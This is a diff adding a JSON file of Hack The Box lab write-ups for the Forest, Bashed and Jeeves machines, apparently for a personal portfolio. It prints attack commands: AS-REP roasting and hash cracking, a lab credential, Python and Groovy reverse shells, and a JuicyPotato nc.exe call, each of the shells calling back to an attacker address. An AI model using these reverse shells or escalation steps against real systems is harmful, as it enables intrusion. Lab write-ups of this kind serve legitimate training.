@@ -1,0 +1,42 @@
+[
+  {
+    "id": "forest",
+    "name": "Forest",
+    "os": "Windows",
+    "difficulty": "Easy",
+    "status": "Completed",
+    "dateCompleted": "2024-12-15",
+    "tags": ["Active Directory", "Kerberoasting", "DCSync"],
+    "writeup": "# Forest - HTB Writeup\n\n## Machine Information\n- **OS**: Windows\n- **Difficulty**: Easy\n- **Date Completed**: December 15, 2024\n\n## Enumeration\n\n### Nmap Scan\n```bash\nnmap -sC -sV -oA forest 10.10.10.161\n```\n\n### Results\n- Port 88: Kerberos\n- Port 389: LDAP\n- Port 445: SMB\n\n## Exploitation\n\n### ASREPRoasting\nFound users without Kerberos pre-authentication:\n```bash\nGetNPUsers.py htb.local/ -no-pass -usersfile users.txt\n```\n\n### Cracking Hash\n```bash\nhashcat -m 18200 hash.txt rockyou.txt\n```\n\n## Privilege Escalation\n\n### DCSync Attack\nUsed BloodHound to identify path to Domain Admin:\n```bash\nbloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all\n```\n\n## Root\nSuccessfully obtained Domain Admin privileges and retrieved both flags.\n\n**User Flag**: `32a-...-de4`\n**Root Flag**: `f04-...-a4e`"
+  },
+  {
+    "id": "bashed",
+    "name": "Bashed",
+    "os": "Linux",
+    "difficulty": "Easy",
+    "status": "Completed",
+    "dateCompleted": "2024-12-10",
+    "tags": ["Web Shell", "Privilege Escalation", "Sudo"],
+    "writeup": "# Bashed - HTB Writeup\n\n## Machine Information\n- **OS**: Linux\n- **Difficulty**: Easy\n- **Date Completed**: December 10, 2024\n\n## Enumeration\n\n### Web Enumeration\nFound phpbash.php web shell in /dev/ directory.\n\n## Exploitation\n\n### Initial Access\nUsed the web shell to get initial foothold:\n```bash\nwhoami\n# www-data\n```\n\n### Reverse Shell\n```bash\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.x\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n## Privilege Escalation\n\n### Sudo Permissions\n```bash\nsudo -l\n# User scriptmanager may run the following commands on bashed:\n#    (scriptmanager : scriptmanager) NOPASSWD: ALL\n```\n\n### Root via Scripts\nFound scripts directory with root execution:\n```bash\necho 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.x\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > test.py\n```\n\n## Root\nObtained root access through scheduled script execution.\n\n**User Flag**: `2c2-...-bb7`\n**Root Flag**: `cc4-...-a4e`"
+  },
+  {
+    "id": "jeeves",
+    "name": "Jeeves",
+    "os": "Windows",
+    "difficulty": "Medium",
+    "status": "Completed", 
+    "dateCompleted": "2024-12-05",
+    "tags": ["Jenkins", "RCE", "Alternate Data Streams"],
+    "writeup": "# Jeeves - HTB Writeup\n\n## Machine Information\n- **OS**: Windows\n- **Difficulty**: Medium\n- **Date Completed**: December 5, 2024\n\n## Enumeration\n\n### Port Scan\n```bash\nnmap -sC -sV -oA jeeves 10.10.10.63\n```\n\n### Jenkins Discovery\nFound Jenkins on port 50000 without authentication.\n\n## Exploitation\n\n### Jenkins Script Console\nUsed Groovy script console for RCE:\n```groovy\nString host=\"10.10.14.x\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n```\n\n## Privilege Escalation\n\n### Token Impersonation\nUsed JuicyPotato for privilege escalation:\n```cmd\nJuicyPotato.exe -l 9999 -p nc.exe -a \"-e cmd.exe 10.10.14.x 5555\" -t *\n```\n\n## Root\n\n### Alternate Data Streams\nRoot flag hidden in ADS:\n```cmd\ndir /R\n# Found hm.txt:root.txt:$DATA\nmore < hm.txt:root.txt\n```\n\n**User Flag**: `af6-...-0e8`\n**Root Flag**: `18a-...-d20`"
+  },
+  {
+    "id": "academy",
+    "name": "Academy",
+    "os": "Linux", 
+    "difficulty": "Easy",
+    "status": "In Progress",
+    "dateCompleted": null,
+    "tags": ["Web", "MySQL", "Laravel"],
+    "writeup": null
+  }
+]
